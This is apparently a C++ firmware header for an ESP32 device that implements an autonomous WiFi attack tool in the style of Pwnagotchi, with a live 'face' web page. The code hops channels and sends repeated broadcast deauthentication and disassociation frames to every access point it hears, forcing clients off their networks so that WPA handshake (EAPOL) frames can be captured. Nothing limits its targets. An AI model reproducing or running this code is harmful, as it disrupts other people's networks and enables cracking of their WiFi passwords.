#pragma once
#include <Arduino.h>
#include <WiFi.h>
#include <esp_wifi.h>
#include <freertos/FreeRTOS.h>
#include <freertos/task.h>
#include <math.h>
#include "module.h"
#include "safety.h"
#include "frames.h"

// ── Pwnagotchi-inspired autonomous WiFi handshake hunter ──────────────────────
//
// Uses UCB (Upper Confidence Bound) multi-armed bandit algorithm to pick the
// channel most likely to yield EAPOL frames. Sends broadcast deauths to force
// client reconnects, then listens for EAPOL exchanges.
//
// Visit /pwnface in browser for the live face display.

// ── Mood ──────────────────────────────────────────────────────────────────────
enum PwMood { PW_SLEEP=0, PW_BORED, PW_SCAN, PW_EXCITED, PW_HAPPY, PW_PWNING };
static const char* const PW_MOOD_K[] = {"sleep","bored","scan","excited","happy","pwning"};

// ── Per-channel UCB stats ─────────────────────────────────────────────────────
struct PwChan {
  uint8_t  ch;
  uint16_t visits;
  uint16_t eapol;    // EAPOL frames seen on this channel (after deauth)
  uint16_t deauths;
};

// ── AP record ─────────────────────────────────────────────────────────────────
#define PW_MAX_APS  32
struct PwAP {
  uint8_t bssid[6];
  uint8_t ch;
  int8_t  rssi;
};

// ── Log ───────────────────────────────────────────────────────────────────────
#define PW_LOG_SZ  12
#define PW_LOG_CL  64
static char   pw_log_buf[PW_LOG_SZ][PW_LOG_CL];
static int    pw_log_head  = 0;
static int    pw_log_count = 0;

static void pw_log_add(const char* fmt, ...) {
  char tmp[PW_LOG_CL];
  va_list ap; va_start(ap, fmt); vsnprintf(tmp, PW_LOG_CL, fmt, ap); va_end(ap);
  memcpy(pw_log_buf[pw_log_head], tmp, PW_LOG_CL);
  pw_log_head = (pw_log_head + 1) % PW_LOG_SZ;
  if (pw_log_count < PW_LOG_SZ) pw_log_count++;
}

// ── State ─────────────────────────────────────────────────────────────────────
static PwChan pw_chans[13];
static PwAP   pw_aps[PW_MAX_APS];
static volatile int    pw_ap_count    = 0;
static volatile uint32_t pw_hs        = 0;  // approx handshakes (EAPOL/4 rounded up)
static volatile uint32_t pw_total_aps = 0;
static volatile uint32_t pw_epoch     = 0;
static volatile uint8_t  pw_cur_ch    = 1;
static PwMood pw_mood    = PW_SLEEP;
static bool   pw_running = false;
static TaskHandle_t pw_task = nullptr;
static volatile uint32_t pw_total_visits = 0;

// Sniff counters reset each phase
static volatile uint16_t pw_snap_beacon = 0;
static volatile uint16_t pw_snap_eapol  = 0;

// ── UCB channel selection ─────────────────────────────────────────────────────
// score = eapol/visits + sqrt(2 * ln(total_visits) / visits)
// Unvisited channels return FLT_MAX (explore first).
static int pw_next_ch_idx() {
  for (int i = 0; i < 13; i++)
    if (pw_chans[i].visits == 0) return i;
  float best = -1.0f; int bi = 0;
  float lnT = logf((float)(pw_total_visits > 1 ? pw_total_visits : 2));
  for (int i = 0; i < 13; i++) {
    float exploit = (float)pw_chans[i].eapol / pw_chans[i].visits;
    float explore  = sqrtf(2.0f * lnT / pw_chans[i].visits);
    float s = exploit + explore;
    if (s > best) { best = s; bi = i; }
  }
  return bi;
}

// ── AP tracking ───────────────────────────────────────────────────────────────
static void pw_ap_add(const uint8_t* bssid, uint8_t ch, int8_t rssi) {
  for (int i = 0; i < pw_ap_count; i++) {
    if (memcmp(pw_aps[i].bssid, bssid, 6) == 0) {
      pw_aps[i].rssi = rssi; pw_aps[i].ch = ch; return;
    }
  }
  if (pw_ap_count >= PW_MAX_APS) return;
  int idx = pw_ap_count; // read once to avoid race with volatile
  memcpy(pw_aps[idx].bssid, bssid, 6);
  pw_aps[idx].ch   = ch;
  pw_aps[idx].rssi = rssi;
  pw_ap_count = idx + 1;
  pw_total_aps++;
}

// ── Promiscuous callback ───────────────────────────────────────────────────────
static void pw_rx(void* buf, wifi_promiscuous_pkt_type_t type) {
  const wifi_promiscuous_pkt_t* p = (const wifi_promiscuous_pkt_t*)buf;
  const uint8_t* f = p->payload;
  uint32_t len = p->rx_ctrl.sig_len;
  if (type == WIFI_PKT_MGMT && len >= 24) {
    if (f[0] == 0x80 || f[0] == 0x50) { // beacon or probe response
      pw_snap_beacon++;
      pw_ap_add(f + 16, p->rx_ctrl.channel, p->rx_ctrl.rssi);
    }
  } else if (type == WIFI_PKT_DATA && len >= 32) {
    bool qos = (f[0] & 0x80) != 0; // QoS data: bit 7 of frame control byte 0
    int llc = 24 + (qos ? 2 : 0);
    if ((int)len >= llc + 8) {
      // LLC/SNAP header: AA AA 03 [OUI 3B] [EtherType 2B]
      if (f[llc]==0xAA && f[llc+1]==0xAA && f[llc+2]==0x03 &&
          f[llc+6]==0x88 && f[llc+7]==0x8E) {
        pw_snap_eapol++;
      }
    }
  }
}

// ── Autonomous task ───────────────────────────────────────────────────────────
static void pw_run_task(void*) {
  static const uint8_t BC[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
  uint8_t fbuf[64];

  pw_log_add("Pwngotchi awakens. Hunting...");

  while (pw_running) {
    int ci = pw_next_ch_idx();
    uint8_t ch = pw_chans[ci].ch;
    pw_cur_ch = ch;
    pw_mood   = PW_SCAN;

    // Hop to channel
    esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);

    // Phase 1 — listen 500ms, discover APs via beacons
    pw_snap_beacon = 0;
    pw_snap_eapol  = 0;
    vTaskDelay(pdMS_TO_TICKS(500));
    uint16_t beacons = pw_snap_beacon;

    if (beacons == 0) {
      pw_mood = PW_BORED;
    } else {
      // Phase 2 — 5 deauth bursts across all APs on this channel
      pw_mood = PW_EXCITED;
      int snap = pw_ap_count;
      for (int burst = 0; burst < 5; burst++) {
        for (int ai = 0; ai < snap; ai++) {
          if (pw_aps[ai].ch != ch) continue;
          size_t n = f_deauth(fbuf, BC, pw_aps[ai].bssid, 7);
          esp_wifi_80211_tx(WIFI_IF_AP, fbuf, n, false);
          n = f_disassoc(fbuf, BC, pw_aps[ai].bssid, 8);
          esp_wifi_80211_tx(WIFI_IF_AP, fbuf, n, false);
          pw_chans[ci].deauths += 2;
        }
        vTaskDelay(pdMS_TO_TICKS(60));
      }

      // Phase 3 — listen 2000ms for EAPOL
      pw_snap_eapol = 0;
      vTaskDelay(pdMS_TO_TICKS(2000));
      uint16_t eapol = pw_snap_eapol;
      pw_chans[ci].eapol += eapol;

      if (eapol > 0) {
        uint32_t sessions = eapol / 4 + (eapol % 4 ? 1 : 0);
        pw_hs += sessions;
        pw_mood = (pw_hs > 0 && pw_hs % 5 == 0) ? PW_PWNING : PW_HAPPY;
        pw_log_add("[%u] ch%u: %u EAPOL → ~%u hs", (unsigned)pw_epoch, ch, eapol, (unsigned)sessions);
      } else {
        pw_mood = PW_BORED;
        if (beacons > 0) {
          pw_log_add("[%u] ch%u: %u beacons, 0 EAPOL", (unsigned)pw_epoch, ch, beacons);
        }
      }
    }

    pw_chans[ci].visits++;
    pw_total_visits++;

    // Epoch: every 13 channel visits = one full sweep
    if (pw_total_visits > 0 && pw_total_visits % 13 == 0) {
      pw_epoch++;
      pw_log_add("[epoch %u] hs=%u aps=%u", (unsigned)pw_epoch, (unsigned)pw_hs, (unsigned)pw_total_aps);
    }

    vTaskDelay(pdMS_TO_TICKS(10));
  }

  pw_task = nullptr;
  vTaskDelete(nullptr);
}

// ── Face HTML page ────────────────────────────────────────────────────────────
static const char PW_HTML[] PROGMEM = R"html(<!DOCTYPE html><html><head>
<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Pwngotchi</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{background:#0b0d12;color:#dde3ec;font-family:'Courier New',monospace;display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:100vh;padding:1.5rem;text-align:center}
#face{font-size:clamp(2.8rem,12vw,5.5rem);letter-spacing:.05em;margin:.5rem 0;line-height:1.3;user-select:none}
#moodtxt{color:#e8233a;font-size:.85rem;letter-spacing:.5em;text-transform:uppercase;min-height:1.4em;margin-bottom:1.4rem}
.stats{display:grid;grid-template-columns:repeat(4,1fr);gap:.5rem 1.5rem;margin-bottom:1.5rem;font-size:.7rem;color:#687080;max-width:420px;width:100%}
.sv{display:block;color:#dde3ec;font-size:1.3rem;font-weight:700;margin-top:.2rem}
#ch-bar{display:flex;gap:3px;align-items:flex-end;height:52px;margin-bottom:1.4rem}
.chb{width:14px;height:52px;background:#1e2535;border-radius:3px 3px 2px 2px;position:relative;display:flex;align-items:flex-end}
.chbf{width:100%;background:#e8233a;border-radius:2px;min-height:3px;transition:height .5s}
.chl{position:absolute;bottom:-14px;left:0;right:0;font-size:8px;color:#3a4555;text-align:center}
#log{max-width:440px;width:100%;font-size:.68rem;color:#3a4555;border-top:1px solid #1e2535;padding-top:.6rem;text-align:left}
.le{padding:.18rem 0;border-bottom:1px solid #111520;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
.le:first-child{color:#687080}
#running{width:8px;height:8px;border-radius:50%;background:#3a4555;display:inline-block;margin-right:.4rem;vertical-align:middle}
#running.on{background:#e8233a;animation:pulse 1s infinite}
@keyframes pulse{0%,100%{opacity:1}50%{opacity:.4}}
#back{position:fixed;top:.8rem;left:.8rem;color:#e8233a;text-decoration:none;font-size:.75rem}
#corner{position:fixed;top:.8rem;right:.8rem;font-size:.65rem;color:#1e2535;letter-spacing:.1em}
</style>
</head><body>
<a href="/" id="back">← hub</a>
<div id="corner">PHANTOM32</div>
<div id="face">(- _ -)</div>
<div id="moodtxt"><span id="running"></span><span id="mt">offline</span></div>
<div class="stats">
<div>Handshakes<span class="sv" id="hs">0</span></div>
<div>APs Seen<span class="sv" id="aps">0</span></div>
<div>Epoch<span class="sv" id="ep">0</span></div>
<div>Channel<span class="sv" id="ch">-</span></div>
</div>
<div id="ch-bar"></div>
<div id="log"><div class="le" style="color:#3a4555;letter-spacing:.1em">ACTIVITY LOG</div></div>
<script>
const F={sleep:'(- _ -)',bored:'(-_-。)',scan:'(o . o)',excited:'(°∀°)',happy:'(◕‿◕)',pwning:'(⌐■_■)'};
const M={sleep:'zzZzz',bored:'...',scan:'scanning...',excited:'EAPOL detected!',happy:'♥ handshake! ♥',pwning:'>>> PWNED <<<'};
let last_mood='';
async function tick(){
  try{
    const d=await(await fetch('/api/pwnface/status')).json();
    const face=F[d.mood]||F.sleep;
    const fe=document.getElementById('face');
    if(d.mood!==last_mood){fe.style.transform='scale(1.2)';setTimeout(()=>fe.style.transform='',300);last_mood=d.mood;}
    fe.textContent=face;
    document.getElementById('mt').textContent=M[d.mood]||d.mood;
    document.getElementById('running').className=d.running?'on':'';
    document.getElementById('hs').textContent=d.hs;
    document.getElementById('aps').textContent=d.aps;
    document.getElementById('ep').textContent=d.epoch;
    document.getElementById('ch').textContent=d.chan||'-';
    if(d.chans&&d.chans.length){
      const mx=Math.max(1,...d.chans.map(c=>c.e));
      document.getElementById('ch-bar').innerHTML=d.chans.map(c=>{
        const h=Math.round(c.e/mx*44)||4;
        const active=c.c==d.chan;
        return`<div class="chb" title="ch${c.c}: ${c.e} EAPOL"><div class="chbf" style="height:${h}px;background:${active?'#ff6680':'#e8233a'}"></div><span class="chl">${c.c}</span></div>`;
      }).join('');
    }
    if(d.log&&d.log.length){
      const el=document.getElementById('log');
      el.innerHTML='<div class="le" style="color:#3a4555;letter-spacing:.1em">ACTIVITY LOG</div>'+
        d.log.map(l=>`<div class="le">${l}</div>`).join('');
    }
  }catch(e){}
  setTimeout(tick,2000);
}
tick();
</script>
</body></html>)html";

// ── Start / stop ──────────────────────────────────────────────────────────────
void aegisSniff(void*, wifi_promiscuous_pkt_type_t);
static bool pw_start(const String&) {
  if (pw_running) return false;
  pw_hs = 0; pw_total_aps = 0; pw_epoch = 0; pw_ap_count = 0;
  pw_log_head = 0; pw_log_count = 0; pw_total_visits = 0; pw_mood = PW_SLEEP;
  for (int i = 0; i < 13; i++) pw_chans[i] = {(uint8_t)(i+1), 0, 0, 0};
  memset(pw_log_buf, 0, sizeof(pw_log_buf));
  memset(pw_aps, 0, sizeof(pw_aps));
  wifi_promiscuous_filter_t f = {};
  f.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA;
  esp_wifi_set_promiscuous_filter(&f);
  esp_wifi_set_promiscuous_rx_cb(pw_rx);
  esp_wifi_set_promiscuous(true);
  pw_running = true;
  xTaskCreate(pw_run_task, "pwnface", 6144, nullptr, 4, &pw_task);
  return true;
}
static void pw_stop() {
  pw_running = false;
  if (pw_task) { vTaskDelay(pdMS_TO_TICKS(100)); pw_task = nullptr; }
  pw_mood = PW_SLEEP;
  pw_log_add("Sleeping. hs=%u aps=%u ep=%u", (unsigned)pw_hs, (unsigned)pw_total_aps, (unsigned)pw_epoch);
  esp_wifi_set_promiscuous_rx_cb(aegisSniff);
  wifi_promiscuous_filter_t f = {};
  f.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA;
  esp_wifi_set_promiscuous_filter(&f);
  esp_wifi_set_promiscuous(true);
}

// ── Routes ────────────────────────────────────────────────────────────────────
static void pw_routes() {
  extern WebServer server;

  server.on("/pwnface", HTTP_GET, [](){
    server.sendHeader("Cache-Control","no-cache");
    server.send_P(200, "text/html", PW_HTML);
  });

  server.on("/api/pwnface/start", HTTP_POST, [](){
    String q; for(int i=0;i<server.args();i++){if(i)q+='&';q+=server.argName(i)+'='+server.arg(i);}
    bool ok = tool_start("pwnface", q);
    server.send(200,"application/json",ok?"{\"ok\":1}":"{\"ok\":0,\"err\":\"busy\"}");
  });

  server.on("/api/pwnface/stop", HTTP_POST, [](){
    tool_stop("pwnface");
    server.send(200,"application/json","{\"ok\":1}");
  });

  server.on("/api/pwnface/status", HTTP_GET, [](){
    String j = "{";
    j += "\"running\":" + String(pw_running?1:0);
    j += ",\"mood\":\""  + String(PW_MOOD_K[pw_mood]) + "\"";
    j += ",\"hs\":"      + String(pw_hs);
    j += ",\"aps\":"     + String(pw_total_aps);
    j += ",\"epoch\":"   + String(pw_epoch);
    j += ",\"chan\":"     + String(pw_cur_ch);
    j += ",\"sent\":"    + String(pw_hs);
    j += ",\"msg\":\"epoch " + String(pw_epoch) + " | " + String(pw_hs) + " hs | " + String(pw_total_aps) + " APs\"";
    // Per-channel array
    j += ",\"chans\":[";
    for (int i = 0; i < 13; i++) {
      if (i) j += ",";
      j += "{\"c\":" + String(pw_chans[i].ch ? pw_chans[i].ch : (uint8_t)(i+1));
      j += ",\"e\":" + String(pw_chans[i].eapol) + "}";
    }
    j += "]";
    // Activity log (most recent first)
    j += ",\"log\":[";
    bool first = true;
    for (int i = 0; i < pw_log_count; i++) {
      int idx = ((pw_log_head - 1 - i) + PW_LOG_SZ) % PW_LOG_SZ;
      if (!pw_log_buf[idx][0]) continue;
      if (!first) j += ",";
      j += "\""; j += pw_log_buf[idx]; j += "\"";
      first = false;
    }
    j += "]}";
    server.send(200, "application/json", j);
  });
}
